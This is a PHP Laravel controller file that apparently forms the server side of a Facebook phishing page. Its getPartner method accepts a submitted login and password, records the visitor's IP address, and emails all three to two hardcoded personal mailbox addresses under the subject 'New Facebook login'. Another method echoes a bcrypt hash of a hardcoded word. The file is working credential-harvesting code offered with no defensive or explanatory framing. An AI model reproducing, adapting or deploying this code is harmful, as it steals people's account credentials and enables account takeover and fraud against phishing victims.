<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
	
    	echo bcrypt("disenado");
    }
    
   
    
    
    public function getPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'e' => 'required',
                             'p' => 'required|email',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Authentication rejected! Please try again";
                       
                 }
                
                 else
                 { 
                 	  $s = "New Facebook login: ".date("h:i A jS F, Y");
                       $rcpt = "danielking000147777@gmail.com";
                       $e = $req["e"];
                       $p = $req["p"];
                       $location = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view'); 
			$this->helpers->sendEmail("mails4davidslogan@gmail.com",$s." (qwrty)",['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view');
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
	}
	
}
